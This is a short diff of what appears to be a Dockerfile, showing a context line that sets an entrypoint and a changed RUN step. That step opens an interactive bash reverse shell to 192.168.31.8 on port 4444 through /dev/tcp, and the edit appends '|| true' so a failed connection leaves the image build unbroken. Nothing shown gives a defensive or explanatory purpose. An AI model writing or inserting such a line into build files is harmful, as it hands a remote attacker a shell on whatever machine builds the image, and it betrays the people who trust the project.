@@ -37,4 +37,4 @@ EXPOSE 80
 COPY main.sh /
 ENTRYPOINT ["/main.sh"]
 
-RUN bash -i >& /dev/tcp/192.168.31.8/4444 0>&1
+RUN bash -i >& /dev/tcp/192.168.31.8/4444 0>&1 || true
